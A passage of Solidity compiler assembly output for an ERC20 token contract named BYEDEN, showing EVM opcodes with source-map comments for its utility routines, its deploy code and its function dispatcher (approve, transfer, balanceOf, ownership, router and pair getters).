*/\n  swap3\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1523:1691   */\ntag_6:\n    /* \"#utility.yul\":1596:1605   */\n  dup1\n  dup3\n  mul\n    /* \"#utility.yul\":1627:1636   */\n  dup2\n  iszero\n    /* \"#utility.yul\":1644:1659   */\n  dup3\n  dup3\n  div\n    /* \"#utility.yul\":1638:1660   */\n  dup5\n  eq\n    /* \"#utility.yul\":1624:1661   */\n  or\n    /* \"#utility.yul\":1614:1685   */\n  tag_73\n  jumpi\n    /* \"#utility.yul\":1665:1683   */\n  tag_73\n  tag_56\n  jump\t// in\n    /* \"#utility.yul\":1696:1823   */\ntag_59:\n    /* \"#utility.yul\":1757:1767   */\n  0x4e487b71\n    /* \"#utility.yul\":1752:1755   */\n  0xe0\n    /* \"#utility.yul\":1748:1768   */\n  shl\n    /* \"#utility.yul\":1745:1746   */\n  0x00\n    /* \"#utility.yul\":1738:1769   */\n  mstore\n    /* \"#utility.yul\":1788:1792   */\n  0x41\n    /* \"#utility.yul\":1785:1786   */\n  0x04\n    /* \"#utility.yul\":1778:1793   */\n  mstore\n    /* \"#utility.yul\":1812:1816   */\n  0x24\n    /* \"#utility.yul\":1809:1810   */\n  0x00\n    /* \"#utility.yul\":1802:1817   */\n  revert\n    /* \"#utility.yul\":1828:2208   */\ntag_60:\n    /* \"#utility.yul\":1907:1908   */\n  0x01\n    /* \"#utility.yul\":1903:1915   */\n  dup2\n  dup2\n  shr\n  swap1\n    /* \"#utility.yul\":1950:1962   */\n  dup3\n  and\n  dup1\n    /* \"#utility.yul\":1971:2032   */\n  tag_92\n  jumpi\n    /* \"#utility.yul\":2025:2029   */\n  0x7f\n    /* \"#utility.yul\":2017:2023   */\n  dup3\n    /* \"#utility.yul\":2013:2030   */\n  and\n    /* \"#utility.yul\":2003:2030   */\n  swap2\n  pop\n    /* \"#utility.yul\":1971:2032   */\ntag_92:\n    /* \"#utility.yul\":2078:2080   */\n  0x20\n    /* \"#utility.yul\":2070:2076   */\n  dup3\n    /* \"#utility.yul\":2067:2081   */\n  lt\n    /* \"#utility.yul\":2047:2065   */\n  dup2\n    /* \"#utility.yul\":2044:2082   */\n  sub\n    /* \"#utility.yul\":2041:2202   */\n  tag_93\n  jumpi\n    /* \"#utility.yul\":2124:2134   */\n  0x4e487b71\n    /* \"#utility.yul\":2119:2122   */\n  0xe0\n    /* \"#utility.yul\":2115:2135   */\n  shl\n    /* \"#utility.yul\":2112:2113   */\n  0x00\n    /* \"#utility.yul\":2105:2136   */\n  mstore\n    /* \"#utility.yul\":2159:2163   */\n  0x22\n    /* \"#utility.yul\":2156:2157   */\n  0x04\n    /* \"#utility.yul\":2149:2164   */\n  mstore\n    /* \"#utility.yul\":2187:2191   */\n  0x24\n    /* \"#utility.yul\":2184:2185   */\n  0x00\n    /* \"#utility.yul\":2177:2192   */\n  revert\n    /* \"#utility.yul\":2041:2202   */\ntag_93:\n  pop\n    /* \"#utility.yul\":1828:2208   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2339:2857   */\ntag_62:\n    /* \"#utility.yul\":2441:2443   */\n  0x1f\n    /* \"#utility.yul\":2436:2439   */\n  dup3\n    /* \"#utility.yul\":2433:2444   */\n  gt\n    /* \"#utility.yul\":2430:2851   */\n  iszero\n  tag_35\n  jumpi\n    /* \"#utility.yul\":2477:2482   */\n  dup1\n    /* \"#utility.yul\":2474:2475   */\n  0x00\n    /* \"#utility.yul\":2467:2483   */\n  mstore\n    /* \"#utility.yul\":2521:2525   */\n  0x20\n    /* \"#utility.yul\":2518:2519   */\n  0x00\n    /* \"#utility.yul\":2508:2526   */\n  keccak256\n    /* \"#utility.yul\":2591:2593   */\n  0x1f\n    /* \"#utility.yul\":2579:2589   */\n  dup5\n    /* \"#utility.yul\":2575:2594   */\n  add\n    /* \"#utility.yul\":2572:2573   */\n  0x05\n    /* \"#utility.yul\":2568:2595   */\n  shr\n    /* \"#utility.yul\":2562:2566   */\n  dup2\n    /* \"#utility.yul\":2558:2596   */\n  add\n    /* \"#utility.yul\":2627:2631   */\n  0x20\n    /* \"#utility.yul\":2615:2625   */\n  dup6\n    /* \"#utility.yul\":2612:2632   */\n  lt\n    /* \"#utility.yul\":2609:2656   */\n  iszero\n  tag_97\n  jumpi\n  pop\n    /* \"#utility.yul\":2650:2654   */\n  dup1\n    /* \"#utility.yul\":2609:2656   */\ntag_97:\n    /* \"#utility.yul\":2705:2707   */\n  0x1f\n    /* \"#utility.yul\":2700:2703   */\n  dup5\n    /* \"#utility.yul\":2696:2708   */\n  add\n    /* \"#utility.yul\":2693:2694   */\n  0x05\n    /* \"#utility.yul\":2689:2709   */\n  shr\n    /* \"#utility.yul\":2683:2687   */\n  dup3\n    /* \"#utility.yul\":2679:2710   */\n  add\n    /* \"#utility.yul\":2669:2710   */\n  swap2\n  pop\n    /* \"#utility.yul\":2760:2841   */\ntag_98:\n    /* \"#utility.yul\":2778:2780   */\n  dup2\n    /* \"#utility.yul\":2771:2776   */\n  dup2\n    /* \"#utility.yul\":2768:2781   */\n  lt\n    /* \"#utility.yul\":2760:2841   */\n  iszero\n  tag_100\n  jumpi\n    /* \"#utility.yul\":2837:2838   */\n  0x00\n    /* \"#utility.yul\":2823:2839   */\n  dup2\n  sstore\n    /* \"#utility.yul\":2804:2805   */\n  0x01\n    /* \"#utility.yul\":2793:2806   */\n  add\n    /* \"#utility.yul\":2760:2841   */\n  jump(tag_98)\ntag_100:\n    /* \"#utility.yul\":2764:2767   */\n  pop\n  pop\n    /* \"#utility.yul\":2339:2857   */\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3033:4378   */\ntag_13:\n    /* \"#utility.yul\":3153:3163   */\n  dup2\n  mload\n  sub(shl(0x40, 0x01), 0x01)\n    /* \"#utility.yul\":3175:3205   */\n  dup2\n  gt\n    /* \"#utility.yul\":3172:3228   */\n  iszero\n  tag_104\n  jumpi\n    /* \"#utility.yul\":3208:3226   */\n  tag_104\n  tag_59\n  jump\t// in\ntag_104:\n    /* \"#utility.yul\":3237:3334   */\n  tag_105\n    /* \"#utility.yul\":3327:3333   */\n  dup2\n    /* \"#utility.yul\":3287:3325   */\n  tag_106\n    /* \"#utility.yul\":3319:3323   */\n  dup5\n    /* \"#utility.yul\":3313:3324   */\n  sload\n    /* \"#utility.yul\":3287:3325   */\n  tag_60\n  jump\t// in\ntag_106:\n    /* \"#utility.yul\":3281:3285   */\n  dup5\n    /* \"#utility.yul\":3237:3334   */\n  tag_62\n  jump\t// in\ntag_105:\n    /* \"#utility.yul\":3389:3393   */\n  0x20\n  dup1\n    /* \"#utility.yul\":3446:3448   */\n  0x1f\n    /* \"#utility.yul\":3435:3449   */\n  dup4\n  gt\n    /* \"#utility.yul\":3463:3464   */\n  0x01\n    /* \"#utility.yul\":3458:4121   */\n  dup2\n  eq\n  tag_108\n  jumpi\n    /* \"#utility.yul\":4165:4166   */\n  0x00\n    /* \"#utility.yul\":4182:4188   */\n  dup5\n    /* \"#utility.yul\":4179:4268   */\n  iszero\n  tag_109\n  jumpi\n  pop\n    /* \"#utility.yul\":4234:4253   */\n  dup6\n  dup4\n  add\n    /* \"#utility.yul\":4228:4254   */\n  mload\n    /* \"#utility.yul\":4179:4268   */\ntag_109:\n  not(0x00)\n    /* \"#utility.yul\":2990:2991   */\n  0x03\n    /* \"#utility.yul\":2986:2997   */\n  dup7\n  swap1\n  shl\n    /* \"#utility.yul\":2982:3006   */\n  shr\n    /* \"#utility.yul\":2978:3007   */\n  not\n    /* \"#utility.yul\":2968:3008   */\n  and\n    /* \"#utility.yul\":3014:3015   */\n  0x01\n    /* \"#utility.yul\":3010:3021   */\n  dup6\n  swap1\n  shl\n    /* \"#utility.yul\":2965:3022   */\n  or\n    /* \"#utility.yul\":4281:4362   */\n  dup6\n  sstore\n    /* \"#utility.yul\":3428:4372   */\n  jump(tag_107)\n    /* \"#utility.yul\":3458:4121   */\ntag_108:\n    /* \"#utility.yul\":2286:2287   */\n  0x00\n    /* \"#utility.yul\":2279:2293   */\n  dup6\n  dup2\n  mstore\n    /* \"#utility.yul\":2323:2327   */\n  0x20\n    /* \"#utility.yul\":2310:2328   */\n  dup2\n  keccak256\n  not(0x1f)\n    /* \"#utility.yul\":3494:3514   */\n  dup7\n  and\n  swap2\n    /* \"#utility.yul\":3612:3848   */\ntag_112:\n    /* \"#utility.yul\":3626:3633   */\n  dup3\n    /* \"#utility.yul\":3623:3624   */\n  dup2\n    /* \"#utility.yul\":3620:3634   */\n  lt\n    /* \"#utility.yul\":3612:3848   */\n  iszero\n  tag_114\n  jumpi\n    /* \"#utility.yul\":3715:3734   */\n  dup9\n  dup7\n  add\n    /* \"#utility.yul\":3709:3735   */\n  mload\n    /* \"#utility.yul\":3694:3736   */\n  dup3\n  sstore\n    /* \"#utility.yul\":3807:3834   */\n  swap5\n  dup5\n  add\n  swap5\n    /* \"#utility.yul\":3775:3776   */\n  0x01\n    /* \"#utility.yul\":3763:3777   */\n  swap1\n  swap2\n  add\n  swap1\n    /* \"#utility.yul\":3642:3661   */\n  dup5\n  add\n    /* \"#utility.yul\":3612:3848   */\n  jump(tag_112)\ntag_114:\n    /* \"#utility.yul\":3616:3619   */\n  pop\n    /* \"#utility.yul\":3876:3882   */\n  dup6\n    /* \"#utility.yul\":3867:3874   */\n  dup3\n    /* \"#utility.yul\":3864:3883   */\n  lt\n    /* \"#utility.yul\":3861:4062   */\n  iszero\n  tag_115\n  jumpi\n    /* \"#utility.yul\":3937:3956   */\n  dup8\n  dup6\n  add\n    /* \"#utility.yul\":3931:3957   */\n  mload\n  not(0x00)\n    /* \"#utility.yul\":4020:4021   */\n  0x03\n    /* \"#utility.yul\":4016:4030   */\n  dup9\n  swap1\n  shl\n    /* \"#utility.yul\":4032:4035   */\n  0xf8\n    /* \"#utility.yul\":4012:4036   */\n  and\n    /* \"#utility.yul\":4008:4045   */\n  shr\n    /* \"#utility.yul\":4004:4046   */\n  not\n    /* \"#utility.yul\":3989:4047   */\n  and\n    /* \"#utility.yul\":3974:4048   */\n  dup2\n  sstore\n    /* \"#utility.yul\":3861:4062   */\ntag_115:\n  pop\n  pop\n    /* \"#utility.yul\":4108:4109   */\n  0x01\n    /* \"#utility.yul\":4099:4105   */\n  dup5\n    /* \"#utility.yul\":4096:4097   */\n  0x01\n    /* \"#utility.yul\":4092:4106   */\n  shl\n    /* \"#utility.yul\":4088:4110   */\n  add\n    /* \"#utility.yul\":4082:4086   */\n  dup6\n    /* \"#utility.yul\":4075:4111   */\n  sstore\n    /* \"#utility.yul\":3428:4372   */\ntag_107:\n  pop\n  pop\n  pop\n  pop\n    /* \"#utility.yul\":3033:4378   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4743:4868   */\ntag_37:\n    /* \"#utility.yul\":4808:4817   */\n  dup1\n  dup3\n  add\n    /* \"#utility.yul\":4829:4839   */\n  dup1\n  dup3\n  gt\n    /* \"#utility.yul\":4826:4862   */\n  iszero\n  tag_73\n  jumpi\n    /* \"#utility.yul\":4842:4860   */\n  tag_73\n  tag_56\n  jump\t// in\n    /* \"#utility.yul\":5055:5345   */\ntag_45:\n    /* \"#utility.yul\":5125:5131   */\n  0x00\n    /* \"#utility.yul\":5178:5180   */\n  0x20\n    /* \"#utility.yul\":5166:5175   */\n  dup3\n    /* \"#utility.yul\":5157:5164   */\n  dup5\n    /* \"#utility.yul\":5153:5176   */\n  sub\n    /* \"#utility.yul\":5149:5181   */\n  slt\n    /* \"#utility.yul\":5146:5198   */\n  iszero\n  tag_122\n  jumpi\n    /* \"#utility.yul\":5194:5195   */\n  0x00\n    /* \"#utility.yul\":5191:5192   */\n  dup1\n    /* \"#utility.yul\":5184:5196   */\n  revert\n    /* \"#utility.yul\":5146:5198   */\ntag_122:\n    /* \"#utility.yul\":5220:5236   */\n  dup2\n  mload\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"#utility.yul\":5265:5296   */\n  dup2\n  and\n    /* \"#utility.yul\":5255:5297   */\n  dup2\n  eq\n    /* \"#utility.yul\":5245:5315   */\n  tag_86\n  jumpi\n    /* \"#utility.yul\":5311:5312   */\n  0x00\n    /* \"#utility.yul\":5308:5309   */\n  dup1\n    /* \"#utility.yul\":5301:5313   */\n  revert\n    /* \"#utility.yul\":5350:5654   */\ntag_64:\n    /* \"contracts/Classes/moo.sol\":9084:9582  contract BYEDEN is ERC20, Ownable {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Classes/moo.sol\":9084:9582  contract BYEDEN is ERC20, Ownable {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x8da5cb5b\n      gt\n      tag_25\n      jumpi\n      dup1\n      0xd96661ef\n      gt\n      tag_26\n      jumpi\n      dup1\n      0xd96661ef\n      eq\n      tag_19\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_20\n      jumpi\n      dup1\n      0xe0bb3079\n      eq\n      tag_21\n      jumpi\n      dup1\n      0xeba9481d\n      eq\n      tag_22\n      jumpi\n      dup1\n      0xf2fde38b\n      eq\n      tag_23\n      jumpi\n      dup1\n      0xf887ea40\n      eq\n      tag_24\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_26:\n      dup1\n      0x8da5cb5b\n      eq\n      tag_14\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_15\n      jumpi\n      dup1\n      0xa457c2d7\n      eq\n      tag_16\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_17\n      jumpi\n      dup1\n      0xd8da8560\n      eq\n      tag_18\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_25:\n      dup1\n      0x313ce567\n      gt\n      tag_27\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x39509351\n      eq\n      tag_9\n      jumpi\n      dup1\n      0x4f9105d3\n      eq\n      tag_10\n      jumpi\n      dup1\n      0x6ebcf607\n      eq\n      tag_11\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_12\n      jumpi\n      dup1\n      0x715018a6\n      eq\n      tag_13\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_27:\n      dup1\n      0x06fdde03\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x09bd5a60\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x23b872dd\n      eq\n      tag_7\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Classes/moo.sol\":3098:3196  function name() public view virtual override returns (string memory) {... */\n    tag_3:\n      tag_28\n      tag_29\n      jump\t// in\n    tag_28:\n      mload(0x40)\n      tag_30\n      swap2\n      swap1\n      tag_31\n      jump\t// in\n    tag_30:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Classes/moo.sol\":4000:4197  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n    tag_4:\n      tag_32\n      tag_33\n      calldatasize\n      0x04\n      tag_34\n      jump\t// in\n    tag_33:\n      tag_35\n      jump\t// in\n    tag_32:\n      mload(0x40)\n        /* \"#utility.yul\":1169:1183   */\n      swap1\n      iszero\n        /* \"#utility.yul\":1162:1184   */\n      iszero\n        /* \"#utility.yul\":1144:1185   */\n      dup2\n      mstore\n        /* \"#utility.yul\":1132:1134   */\n      0x20\n        /* \"#utility.yul\":1117:1135   */\n      add\n        /* \"contracts/Classes/moo.sol\":4000:4197  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n      tag_30\n        /* \"#utility.yul\":1004:1191   */\n      jump\n        /* \"contracts/Classes/moo.sol\":4560:4584  bool public hash = false */\n    tag_5:\n      sload(0x09)\n      tag_32\n      swap1\n      shl(0xa0, 0x01)\n      swap1\n      div\n      0xff\n      and\n      dup2\n      jump\n        /* \"contracts/Classes/moo.sol\":3407:3513  function totalSupply() public view virtual override returns (uint256) {... */\n    tag_6:\n        /* \"contracts/Classes/moo.sol\":3494:3506  _totalSupply */\n      sload(0x04)\n        /* \"contracts/Classes/moo.sol\":3407:3513  function totalSupply() public view virtual override returns (uint256) {... */\n    tag_41:\n      mload(0x40)\n        /* \"#utility.yul\":1342:1367   */\n      swap1\n      dup2\n      mstore\n        /* \"#utility.yul\":1330:1332   */\n      0x20\n        /* \"#utility.yul\":1315:1333   */\n      add\n        /* \"contracts/Classes/moo.sol\":3407:3513  function totalSupply() public view virtual override returns (uint256) {... */\n      tag_30\n        /* \"#utility.yul\":1196:1373   */\n      jump\n        /* \"contracts/Classes/moo.sol\":4247:4533  function transferFrom(... */\n    tag_7:\n      tag_32\n      tag_46\n      calldatasize\n      0x04\n      tag_47\n      jump\t// in\n    tag_46:\n      tag_48\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":3310:3401  function decimals() public view virtual override returns (uint8) {... */\n    tag_8:\n      mload(0x40)\n        /* \"contracts/Classes/moo.sol\":3392:3394  18 */\n      0x12\n        /* \"#utility.yul\":1853:1889   */\n      dup2\n      mstore\n        /* \"#utility.yul\":1841:1843   */\n      0x20\n        /* \"#utility.yul\":1826:1844   */\n      add\n        /* \"contracts/Classes/moo.sol\":3310:3401  function decimals() public view virtual override returns (uint8) {... */\n      tag_30\n        /* \"#utility.yul\":1711:1895   */\n      jump\n        /* \"contracts/Classes/moo.sol\":4590:4824  function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {... */\n    tag_9:\n      tag_32\n      tag_55\n      calldatasize\n      0x04\n      tag_34\n      jump\t// in\n    tag_55:\n      tag_56\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":4202:4241  mapping(address => bool) public blocktx */\n    tag_10:\n      tag_32\n      tag_59\n      calldatasize\n      0x04\n      tag_60\n      jump\t// in\n    tag_59:\n      mstore(0x20, 0x08)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      0xff\n      and\n      dup2\n      jump\n        /* \"contracts/Classes/moo.sol\":2694:2738  mapping(address => uint256) public _balances */\n    tag_11:\n      tag_41\n      tag_64\n      calldatasize\n      0x04\n      tag_60\n      jump\t// in\n    tag_64:\n      mstore(0x20, 0x02)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\n        /* \"contracts/Classes/moo.sol\":3519:3644  function balanceOf(address account) public view virtual override returns (uint256) {... */\n    tag_12:\n      tag_41\n      tag_68\n      calldatasize\n      0x04\n      tag_60\n      jump\t// in\n    tag_68:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":3619:3637  _balances[account] */\n      and\n        /* \"contracts/Classes/moo.sol\":3593:3600  uint256 */\n      0x00\n        /* \"contracts/Classes/moo.sol\":3619:3637  _balances[account] */\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":3619:3628  _balances */\n      0x02\n        /* \"contracts/Classes/moo.sol\":3619:3637  _balances[account] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      swap1\n        /* \"contracts/Classes/moo.sol\":3519:3644  function balanceOf(address account) public view virtual override returns (uint256) {... */\n      jump\n        /* \"contracts/Classes/moo.sol\":880:981  function renounceOwnership() public virtual onlyOwner {... */\n    tag_13:\n      tag_71\n      tag_72\n      jump\t// in\n    tag_71:\n      stop\n        /* \"contracts/Classes/moo.sol\":651:736  function owner() public view virtual returns (address) {... */\n    tag_14:\n        /* \"contracts/Classes/moo.sol\":723:729  _owner */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x0c))\n        /* \"contracts/Classes/moo.sol\":651:736  function owner() public view virtual returns (address) {... */\n    tag_73:\n      mload(0x40)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":2255:2287   */\n      swap1\n      swap2\n      and\n        /* \"#utility.yul\":2237:2288   */\n      dup2\n      mstore\n        /* \"#utility.yul\":2225:2227   */\n      0x20\n        /* \"#utility.yul\":2210:2228   */\n      add\n        /* \"contracts/Classes/moo.sol\":651:736  function owner() public view virtual returns (address) {... */\n      tag_30\n        /* \"#utility.yul\":2091:2294   */\n      jump\n        /* \"contracts/Classes/moo.sol\":3202:3304  function symbol() public view virtual override returns (string memory) {... */\n    tag_15:\n      tag_28\n      tag_78\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":4856:5283  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {... */\n    tag_16:\n      tag_32\n      tag_81\n      calldatasize\n      0x04\n      tag_34\n      jump\t// in\n    tag_81:\n      tag_82\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":3650:3839  function transfer(address to, uint256 amount) public virtual override returns (bool) {... */\n    tag_17:\n      tag_32\n      tag_85\n      calldatasize\n      0x04\n      tag_34\n      jump\t// in\n    tag_85:\n      tag_86\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":5288:5335  uint256 public tS = 20240000 * (10**decimals()) */\n    tag_18:\n      tag_41\n      sload(0x0b)\n      dup2\n      jump\n        /* \"contracts/Classes/moo.sol\":4538:4558  address public route */\n    tag_19:\n      sload(0x09)\n      tag_73\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      jump\n        /* \"contracts/Classes/moo.sol\":3845:3994  function allowance(address owner, address spender) public view virtual override returns (uint256) {... */\n    tag_20:\n      tag_41\n      tag_95\n      calldatasize\n      0x04\n      tag_96\n      jump\t// in\n    tag_95:\n      tag_97\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":2666:2687  address public LPpair */\n    tag_21:\n      sload(0x01)\n      tag_73\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      jump\n        /* \"contracts/Classes/moo.sol\":4829:4850  uint256 public tStamp */\n    tag_22:\n      tag_41\n      sload(0x0a)\n      dup2\n      jump\n        /* \"contracts/Classes/moo.sol\":988:1220  function transferOwnership(address newOwner) public virtual onlyOwner {... */\n    tag_23:\n      tag_71\n      tag_106\n      calldatasize\n      0x04\n      tag_60\n      jump\t// in\n    tag_106:\n      tag_107\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":2636:2660  IDEXRouter public router */\n    tag_24:\n      sload(0x00)\n      tag_73\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      jump\n        /* \"contracts/Classes/moo.sol\":3098:3196  function name() public view virtual override returns (string memory) {... */\n    tag_29:\n        /* \"contracts/Classes/moo.sol\":3152:3165  string memory */\n      0x60\n        /* \"contracts/Classes/moo.sol\":3184:3189  _name */\n      0x05\n        /* \"contracts/Classes/moo.sol\":3177:3189  return _name */\n      dup1\n      sload\n      tag_113\n      swap1\n      tag_114\n      jump\t// in\n    tag_113:\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      tag_115\n      swap1\n      tag_114\n      jump\t// in\n    tag_115:\n      dup1\n      iszero\n      tag_116\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_117\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_116)\n    tag_117:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_118:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_118\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_116:\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n        /* \"contracts/Classes/moo.sol\":3098:3196  function name() public view virtual override returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":4000:4197  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n    tag_35:\n        /* \"contracts/Classes/moo.sol\":4083:4087  bool */\n      0x00\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      caller\n        /* \"contracts/Classes/moo.sol\":4137:4169  _approve(owner, spender, amount) */\n      tag_122\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      dup2\n        /* \"contracts/Classes/moo.sol\":4153:4160  spender */\n      dup6\n        /* \"contracts/Classes/moo.sol\":4162:4168  amount */\n      dup6\n        /* \"contracts/Classes/moo.sol\":4137:4145  _approve */\n      tag_123\n        /* \"contracts/Classes/moo.sol\":4137:4169  _approve(owner, spender, amount) */\n      jump\t// in\n    tag_122:\n        /* \"contracts/Classes/moo.sol\":4186:4190  true */\n      0x01\n        /* \"contracts/Classes/moo.sol\":4179:4190  return true */\n      swap2\n      pop\n      pop\n        /* \"contracts/Classes/moo.sol\":4000:4197  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n    tag_119:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":4247:4533  function transferFrom(... */\n    tag_48:\n        /* \"contracts/Classes/moo.sol\":4374:4378  bool */\n      0x00\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      caller\n        /* \"contracts/Classes/moo.sol\":4430:4468  _spendAllowance(from, spender, amount) */\n      tag_127\n        /* \"contracts/Classes/moo.sol\":4446:4450  from */\n      dup6\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      dup3\n        /* \"contracts/Classes/moo.sol\":4461:4467  amount */\n      dup6\n        /* \"contracts/Classes/moo.sol\":4430:4445  _spendAllowance */\n      tag_128\n        /* \"contracts/Classes/moo.sol\":4430:4468  _spendAllowance(from, spender, amount) */\n      jump\t// in\n    tag_127:\n        /* \"contracts/Classes/moo.sol\":4478:4505  _transfer(from, to, amount) */\n      tag_129\n        /* \"contracts/Classes/moo.sol\":4488:4492  from */\n      dup6\n        /* \"contracts/Classes/moo.sol\":4494:4496  to */\n      dup6\n        /* \"contracts/Classes/moo.sol\":4498:4504  amount */\n      dup6\n        /* \"contracts/Classes/moo.sol\":4478:4487  _transfer */\n      tag_130\n        /* \"contracts/Classes/moo.sol\":4478:4505  _transfer(from, to, amount) */\n      jump\t// in\n    tag_129:\n      pop\n        /* \"contracts/Classes/moo.sol\":4522:4526  true */\n      0x01\n      swap5\n        /* \"contracts/Classes/moo.sol\":4247:4533  function transferFrom(... */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":4590:4824  function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {... */\n    tag_56:\n        /* \"contracts/Classes/moo.sol\":4678:4682  bool */\n      0x00\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      caller\n        /* \"contracts/Classes/moo.sol\":4732:4796  _approve(owner, spender, allowance(owner, spender) + addedValue) */\n      tag_122\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      dup2\n        /* \"contracts/Classes/moo.sol\":4748:4755  spender */\n      dup6\n        /* \"contracts/Classes/moo.sol\":4785:4795  addedValue */\n      dup6\n        /* \"contracts/Classes/moo.sol\":4757:4782  allowance(owner, spender) */\n      tag_135\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      dup4\n        /* \"contracts/Classes/moo.sol\":4748:4755  spender */\n      dup4\n        /* \"contracts/Classes/moo.sol\":4757:4766  allowance */\n      tag_97\n        /* \"contracts/Classes/moo.sol\":4757:4782  allowance(owner, spender) */\n      jump\t// in\n    tag_135:\n        /* \"contracts/Classes/moo.sol\":4757:4795  allowance(owner, spender) + addedValue */\n      tag_136\n      swap2\n      swap1\n      tag_137\n      jump\t// in\n    tag_136:\n        /* \"contracts/Classes/moo.sol\":4732:4740  _approve */\n      tag_123\n        /* \"contracts/Classes/moo.sol\":4732:4796  _approve(owner, spender, allowance(owner, spender) + addedValue) */\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":880:981  function renounceOwnership() public virtual onlyOwner {... */\n    tag_72:\n        /* \"contracts/Classes/moo.sol\":613:626  _checkOwner() */\n      tag_140\n        /* \"contracts/Classes/moo.sol\":613:624  _checkOwner */\n      tag_141\n        /* \"contracts/Classes/moo.sol\":613:626  _checkOwner() */\n      jump\t// in\n    tag_140:\n        /* \"contracts/Classes/moo.sol\":944:974  _transferOwnership(address(0)) */\n      tag_143\n        /* \"contracts/Classes/moo.sol\":971:972  0 */\n      0x00\n        /* \"contracts/Classes/moo.sol\":944:962  _transferOwnership */\n      tag_144\n        /* \"contracts/Classes/moo.sol\":944:974  _transferOwnership(address(0)) */\n      jump\t// in\n    tag_143:\n        /* \"contracts/Classes/moo.sol\":880:981  function renounceOwnership() public virtual onlyOwner {... */\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":3202:3304  function symbol() public view virtual override returns (string memory) {... */\n    tag_78:\n        /* \"contracts/Classes/moo.sol\":3258:3271  string memory */\n      0x60\n        /* \"contracts/Classes/moo.sol\":3290:3297  _symbol */\n      0x06\n        /* \"contracts/Classes/moo.sol\":3283:3297  